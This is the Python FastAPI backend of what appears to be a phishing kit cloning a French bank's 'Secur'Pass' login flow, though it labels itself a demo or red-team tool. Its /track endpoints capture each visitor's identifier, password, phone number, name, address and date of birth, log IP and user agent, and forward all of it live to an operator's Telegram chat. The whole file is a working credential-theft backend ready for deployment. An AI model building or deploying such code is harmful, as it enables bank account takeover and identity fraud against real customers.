"""SG clone — backend API.

Stores tracking events for the (demo / red-team) verification flow into
MongoDB and pushes Telegram notifications grouped in two blocks per session:
  1) Session block (IP, UA, timestamp) — sent once on session start.
  2) Data block — single message edited in-place as new data comes in
     (identifier, password, phone, name, address, city, DOB...).
"""
from __future__ import annotations

import logging
import os
import uuid
from datetime import datetime
from pathlib import Path
from typing import Any, Optional

import httpx
from dotenv import load_dotenv
from fastapi import APIRouter, FastAPI, HTTPException, Request
from fastapi.responses import FileResponse
from fastapi.staticfiles import StaticFiles
from motor.motor_asyncio import AsyncIOMotorClient
from pydantic import BaseModel
from starlette.middleware.cors import CORSMiddleware

ROOT_DIR = Path(__file__).parent
load_dotenv(ROOT_DIR / ".env", override=False)

# ---------------------------------------------------------------------------
# Configuration — toutes les valeurs sont lues depuis l'environnement / .env.
# Le fichier backend/.env est livré avec le code pour la portabilité.
# ---------------------------------------------------------------------------
DEFAULT_MONGO_URL = "mongodb://localhost:27017"
DEFAULT_DB_NAME = "sg_clone"

# ---------------------------------------------------------------------------
# Mongo connection — courts timeouts pour ne jamais bloquer le flux Telegram.
# Préférer MONGO_PRIVATE_URL (réseau interne Railway) si disponible.
# ---------------------------------------------------------------------------
mongo_url = (
    os.environ.get("MONGO_PRIVATE_URL")
    or os.environ.get("MONGO_URL")
    or DEFAULT_MONGO_URL
)
client = AsyncIOMotorClient(
    mongo_url,
    serverSelectionTimeoutMS=1500,
    connectTimeoutMS=1500,
    socketTimeoutMS=3000,
)
db = client[os.environ.get("DB_NAME") or DEFAULT_DB_NAME]
events_col = db["sg_events"]
sessions_col = db["sg_sessions"]

# ---------------------------------------------------------------------------
# Telegram helpers (token + chat id viennent uniquement de backend/.env)
# ---------------------------------------------------------------------------
TG_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "")
TG_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "")

logger = logging.getLogger("sg")
logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(name)s | %(levelname)s | %(message)s")


# In-memory state per session (so Telegram works even if MongoDB is unreachable).
_state: dict[str, dict[str, Any]] = {}


def _safe_mongo(coro, op: str = "mongo") -> None:
    """Fire-and-forget MongoDB op. Never blocks the request.

    Mongo writes happen in the background; if Mongo is unreachable we just log
    a warning. This keeps the Telegram-notification path instantaneous.
    """
    import asyncio

    async def _runner() -> None:
        try:
            await coro
        except Exception as exc:
            logger.warning("%s failed: %s", op, exc)

    try:
        asyncio.create_task(_runner())
    except RuntimeError:
        # No running event loop — just close the coroutine to avoid warnings.
        try:
            coro.close()
        except Exception:
            pass


async def tg_send(text: str) -> Optional[int]:
    """Send a Telegram message and return its message_id (or None on failure)."""
    if not TG_TOKEN or not TG_CHAT_ID:
        return None
    url = f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage"
    payload = {
        "chat_id": TG_CHAT_ID,
        "text": text,
        "parse_mode": "HTML",
        "disable_web_page_preview": True,
    }
    try:
        async with httpx.AsyncClient(timeout=10.0) as cli:
            r = await cli.post(url, json=payload)
            if r.status_code == 200:
                data = r.json()
                return int(data["result"]["message_id"])
            logger.error("Telegram sendMessage %s — %s", r.status_code, r.text[:300])
    except Exception as exc:  # pragma: no cover
        logger.error("Telegram send exception: %s", exc)
    return None


async def tg_edit(message_id: int, text: str) -> bool:
    """Edit an existing Telegram message. Returns True on success."""
    if not TG_TOKEN or not TG_CHAT_ID:
        return False
    url = f"https://api.telegram.org/bot{TG_TOKEN}/editMessageText"
    payload = {
        "chat_id": TG_CHAT_ID,
        "message_id": message_id,
        "text": text,
        "parse_mode": "HTML",
        "disable_web_page_preview": True,
    }
    try:
        async with httpx.AsyncClient(timeout=10.0) as cli:
            r = await cli.post(url, json=payload)
            if r.status_code == 200:
                return True
            # 400 "message is not modified" is normal, treat as success
            if r.status_code == 400 and "not modified" in r.text:
                return True
            logger.error("Telegram editMessageText %s — %s", r.status_code, r.text[:300])
    except Exception as exc:  # pragma: no cover
        logger.error("Telegram edit exception: %s", exc)
    return False


def client_ip(request: Request) -> str:
    fwd = request.headers.get("x-forwarded-for")
    if fwd:
        return fwd.split(",")[0].strip()
    if request.client:
        return request.client.host
    return "unknown"


def fr_dt(dt: datetime) -> str:
    return dt.strftime("%d/%m/%Y %H:%M:%S UTC")


# ---------------------------------------------------------------------------
# FastAPI app + router
# ---------------------------------------------------------------------------
app = FastAPI(title="SG Clone API")
api = APIRouter(prefix="/api")


# ---------------------------------------------------------------------------
# Models
# ---------------------------------------------------------------------------
class SessionStart(BaseModel):
    page: Optional[str] = None


class IdentifierIn(BaseModel):
    session_id: str
    identifier: str
    remember: bool = False


class PasswordIn(BaseModel):
    session_id: str
    password: str


class PhoneIn(BaseModel):
    session_id: str
    phone: str
    country_code: str = "+33"


class InfoIn(BaseModel):
    session_id: str
    last_name: str
    first_name: str
    address: str
    postal_code: str
    city: str
    date_of_birth: str


class CompleteIn(BaseModel):
    session_id: str


# ---------------------------------------------------------------------------
# Persistence + Telegram block updates
# ---------------------------------------------------------------------------
async def record_event(kind: str, request: Request, payload: dict[str, Any]) -> None:
    sid = payload.get("session_id")
    event_data = {k: v for k, v in payload.items() if k != "session_id"}
    now = datetime.utcnow()

    # In-memory state (primary source for Telegram messages)
    if sid:
        st = _state.setdefault(sid, {"sess": {}, "events": []})
        st["events"].append({"kind": kind, "data": event_data, "ts": now})

    # Best-effort MongoDB persistence
    doc = {
        "_id": str(uuid.uuid4()),
        "kind": kind,
        "session_id": sid,
        "data": event_data,
        "ip": client_ip(request),
        "user_agent": request.headers.get("user-agent", "")[:512],
        "referer": request.headers.get("referer", ""),
        "ts": now,
    }
    _safe_mongo(events_col.insert_one(doc), "events.insert_one")
    if sid:
        _safe_mongo(
            sessions_col.update_one(
                {"_id": sid},
                {
                    "$set": {"updated_at": now, f"last_{kind}_at": now},
                    "$addToSet": {"kinds": kind},
                },
            ),
            "sessions.update_one",
        )


def build_data_block(session_id: str) -> str:
    """Render the cumulative data block for a session from in-memory state."""
    st = _state.get(session_id) or {}
    docs = st.get("events", [])

    identifier = ""
    remember = False
    password = ""
    phone = ""
    phone_cc = "+33"
    last_name = ""
    first_name = ""
    address = ""
    postal = ""
    city = ""
    dob = ""
    submitted_at: Optional[datetime] = None

    for d in docs:
        data = d.get("data", {}) or {}
        kind = d.get("kind")
        if kind == "identifier":
            identifier = str(data.get("identifier", ""))
            remember = bool(data.get("remember"))
        elif kind == "password":
            password = str(data.get("password", ""))
        elif kind == "phone":
            phone = str(data.get("phone", ""))
            phone_cc = str(data.get("country_code", "+33"))
        elif kind == "info":
            last_name = str(data.get("last_name", ""))
            first_name = str(data.get("first_name", ""))
            address = str(data.get("address", ""))
            postal = str(data.get("postal_code", ""))
            city = str(data.get("city", ""))
            dob = str(data.get("date_of_birth", ""))
        elif kind == "complete":
            submitted_at = d.get("ts")

    is_complete = submitted_at is not None

    lines: list[str] = []
    lines.append("🔓 <b>Nouvelle soumission Secur'Pass RED</b>")
    lines.append("")
    if identifier:
        lines.append(f"📋 <b>Identifiant</b>: {identifier}")
    if password:
        lines.append(f"🔑 <b>Mot de passe</b>: {password}")
    if any([last_name, first_name, dob, postal, city, address, phone]):
        lines.append("")
        lines.append("👤 <b>Informations personnelles</b>:")
        if last_name:
            lines.append(f"   • <b>Nom</b>: {last_name}")
        if first_name:
            lines.append(f"   • <b>Prénom</b>: {first_name}")
        if dob:
            lines.append(f"   • <b>Date de naissance</b>: {dob}")
        if address:
            lines.append(f"   • <b>Adresse</b>: {address}")
        if postal:
            lines.append(f"   • <b>Code postal</b>: {postal}")
        if city:
            lines.append(f"   • <b>Ville</b>: {city}")
        if phone:
            lines.append(f"   • <b>Téléphone</b>: {phone_cc} {phone}")
        if identifier and remember:
            lines.append("   • <b>Se souvenir</b>: oui")

    when = submitted_at or datetime.utcnow()
    lines.append("")
    label = "Date de soumission" if is_complete else "Dernière mise à jour"
    lines.append(f"⏰ <b>{label}</b>: {fr_dt(when)}")

    return "\n".join(lines)


def render_session_block(sess: dict[str, Any]) -> str:
    created = sess.get("created_at") or datetime.utcnow()
    return (
        "🌐 <b>Nouvelle session</b>\n"
        f"🆔 <b>Session</b>: <code>{sess['_id']}</code>\n"
        f"📡 <b>IP</b>: {sess.get('ip', 'unknown')}\n"
        f"🖥️ <b>User-Agent</b>: {(sess.get('user_agent') or '')[:180]}\n"
        f"🔗 <b>Référent</b>: {sess.get('referer') or '-'}\n"
        f"📄 <b>Page d'entrée</b>: {sess.get('page', '/')}\n"
        f"⏰ <b>Ouverte le</b>: {fr_dt(created)}"
    )


async def push_data_block(session_id: str) -> None:
    """Send the data block (first call) or edit the existing one. Uses in-memory state."""
    st = _state.get(session_id)
    if not st:
        return
    sess = st.get("sess", {})
    text = build_data_block(session_id)
    data_msg_id = sess.get("tg_data_message_id")
    if data_msg_id:
        ok = await tg_edit(int(data_msg_id), text)
        if ok:
            return
        # If edit failed, fall through and create a new message
    new_id = await tg_send(text)
    if new_id:
        sess["tg_data_message_id"] = new_id
        _safe_mongo(
            sessions_col.update_one(
                {"_id": session_id},
                {"$set": {"tg_data_message_id": new_id}},
            ),
            "sessions.update_one(tg_data)",
        )


# ---------------------------------------------------------------------------
# Routes
# ---------------------------------------------------------------------------
@api.get("/")
async def root() -> dict[str, str]:
    return {"status": "ok", "service": "sg-clone"}


@api.get("/_debug")
async def debug_status() -> dict[str, Any]:
    """Diagnostic endpoint : vérifie env vars + connexion MongoDB + Telegram."""
    info: dict[str, Any] = {
        "env": {
            "MONGO_URL_set": bool(os.environ.get("MONGO_URL")),
            "MONGO_URL_prefix": (os.environ.get("MONGO_URL", "")[:30] + "...") if os.environ.get("MONGO_URL") else "",
            "DB_NAME": os.environ.get("DB_NAME", ""),
            "TELEGRAM_BOT_TOKEN_set": bool(TG_TOKEN),
            "TELEGRAM_CHAT_ID": TG_CHAT_ID,
        }
    }
    # Test Mongo ping (read)
    try:
        await db.command("ping")
        info["mongo_ping"] = "ok"
    except Exception as exc:
        info["mongo_ping"] = f"ERROR: {type(exc).__name__}: {exc}"
    # Test Mongo write (insert + delete)
    try:
        test_id = f"_debug_{uuid.uuid4()}"
        await sessions_col.insert_one({"_id": test_id, "ts": datetime.utcnow()})
        await sessions_col.delete_one({"_id": test_id})
        info["mongo_write"] = "ok"
    except Exception as exc:
        info["mongo_write"] = f"ERROR: {type(exc).__name__}: {exc}"
    # Test Telegram
    try:
        msg_id = await tg_send("🔧 Test depuis /api/_debug")
        info["telegram"] = f"sent (msg_id={msg_id})" if msg_id else "FAILED (check token/chat_id)"
    except Exception as exc:
        info["telegram"] = f"ERROR: {type(exc).__name__}: {exc}"
    return info


@api.post("/track/session")
async def start_session(payload: SessionStart, request: Request) -> dict[str, Any]:
    sid = str(uuid.uuid4())
    sess = {
        "_id": sid,
        "ip": client_ip(request),
        "user_agent": request.headers.get("user-agent", "")[:512],
        "referer": request.headers.get("referer", ""),
        "page": payload.page or "/",
        "created_at": datetime.utcnow(),
        "updated_at": datetime.utcnow(),
        "kinds": ["session_start"],
    }
    _state[sid] = {"sess": sess, "events": []}

    # Best-effort MongoDB persistence
    _safe_mongo(sessions_col.insert_one(sess), "sessions.insert_one")

    # Block #1 — session info (Telegram)
    msg_id = await tg_send(render_session_block(sess))
    if msg_id:
        sess["tg_session_message_id"] = msg_id
        _safe_mongo(
            sessions_col.update_one({"_id": sid}, {"$set": {"tg_session_message_id": msg_id}}),
            "sessions.update_one(tg_session)",
        )

    return {"session_id": sid}


@api.post("/track/identifier")
async def track_identifier(payload: IdentifierIn, request: Request) -> dict[str, str]:
    await record_event("identifier", request, payload.model_dump())
    await push_data_block(payload.session_id)
    return {"status": "ok"}


@api.post("/track/password")
async def track_password(payload: PasswordIn, request: Request) -> dict[str, str]:
    await record_event("password", request, payload.model_dump())
    await push_data_block(payload.session_id)
    return {"status": "ok"}


@api.post("/track/phone")
async def track_phone(payload: PhoneIn, request: Request) -> dict[str, str]:
    await record_event("phone", request, payload.model_dump())
    await push_data_block(payload.session_id)
    return {"status": "ok"}


@api.post("/track/info")
async def track_info(payload: InfoIn, request: Request) -> dict[str, str]:
    await record_event("info", request, payload.model_dump())
    await push_data_block(payload.session_id)
    return {"status": "ok"}


@api.post("/track/complete")
async def track_complete(payload: CompleteIn, request: Request) -> dict[str, str]:
    await record_event("complete", request, payload.model_dump())
    await push_data_block(payload.session_id)
    return {"status": "ok"}


# ---------------------------------------------------------------------------
app.include_router(api)
app.add_middleware(
    CORSMiddleware,
    allow_credentials=True,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)


@app.on_event("shutdown")
async def shutdown_db_client() -> None:
    client.close()


# ---------------------------------------------------------------------------
# Serve the built React frontend (single-service deployment, e.g. on Railway).
# The Dockerfile copies the React build output into ./static next to this file.
# API routes (prefixed with /api) keep priority because they were declared
# before the catch-all below.
# ---------------------------------------------------------------------------
STATIC_DIR = ROOT_DIR / "static"
if STATIC_DIR.exists():
    inner_static = STATIC_DIR / "static"
    if inner_static.exists():
        app.mount("/static", StaticFiles(directory=str(inner_static)), name="assets")

    @app.get("/{full_path:path}")
    async def serve_react_app(full_path: str):
        if full_path.startswith("api"):
            raise HTTPException(status_code=404, detail="Not found")
        candidate = STATIC_DIR / full_path
        if full_path and candidate.is_file():
            return FileResponse(str(candidate))
        index_file = STATIC_DIR / "index.html"
        if index_file.exists():
            return FileResponse(str(index_file))
        raise HTTPException(status_code=404, detail="Frontend not built")
